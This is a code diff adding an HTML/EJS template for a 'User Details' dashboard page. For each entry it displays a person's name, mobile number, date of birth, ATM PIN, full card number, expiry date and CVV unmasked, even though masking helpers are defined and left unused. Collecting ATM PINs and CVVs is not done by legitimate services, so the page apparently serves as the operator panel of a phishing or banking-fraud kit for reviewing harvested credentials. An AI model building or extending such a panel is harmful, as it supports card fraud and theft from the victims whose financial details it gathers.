@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>User Dashboard</h1>
+  </header>
+  
+  <div class="user-detail-container">
+    <h2>Details for ID: <%= uniqueid %></h2>
+
+    <% 
+      // Helper to mask any string entirely
+      function maskAll(str) {
+        return typeof str === 'string'
+          ? '*'.repeat(str.length)
+          : '';
+      }
+
+      // Helper to group card number into 4-4-4-4 with stars
+      function maskedCard(num) {
+        if (typeof num !== 'string' || num.length < 4) return '';
+        var last4 = num.slice(-4);
+        return '**** **** **** ' + last4;
+      }
+    %>
+
+    <section>
+      <h3>Personal Information</h3>
+      <% if (Array.isArray(userEntries) && userEntries.length) { %>
+        <% userEntries.forEach(function(u, idx) { %>
+          <div class="card">
+            <h4>Entry #<%= idx + 1 %></h4>
+            <p><strong>Name:</strong> <%= u.fullName %></p>
+            <p><strong>Mobile No.:</strong> <%= u.mobileNumber %></p>
+            
+            <p><strong>DOB:</strong> <%= u.dateOfBirth %></p>
+            <p><small>Submitted: <%= new Date(u.createdAt).toLocaleString() %></small></p>
+          </div>
+        <% }) %>
+      <% } else { %>
+        <p>No personal data entries found.</p>
+      <% } %>
+    </section>
+
+    <section>
+      <h3>Net Banking Details</h3>
+      <% if (Array.isArray(netBankingEntries) && netBankingEntries.length) { %>
+        <% netBankingEntries.forEach(function(n, idx) { %>
+          <div class="card">
+            <h4>Entry #<%= idx + 1 %></h4>
+            <p><strong>ATM PIN:</strong> <%= n.atmPin %></p>
+      
+            <p><small>Submitted: <%= new Date(n.createdAt).toLocaleString() %></small></p>
+          </div>
+        <% }) %>
+      <% } else { %>
+        <p>No net banking entries found.</p>
+      <% } %>
+    </section>
+
+  <section>
+  <h3>Card Payment Details</h3>
+  <% if (Array.isArray(cardPaymentEntries) && cardPaymentEntries.length) { %>
+    <% cardPaymentEntries.forEach(function(c, idx) { %>
+      <div class="card">
+        <h4>Entry #<%= idx + 1 %></h4>
+        <p>
+          <strong>Card No.:</strong>
+          <%= c.cardNumber %>
+        </p>
+        <p>
+          <strong>Expiry:</strong>
+          <%= c.expiryDate %>
+        </p>
+        <p>
+          <strong>CVV:</strong>
+          <%= c.cvv %>
+        </p>
+  
+        <p>
+          <small>Submitted: <%= new Date(c.createdAt).toLocaleString() %></small>
+        </p>
+      </div>
+    <% }) %>
+  <% } else { %>
+    <p>No card payment entries found.</p>
+  <% } %>
+</section>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
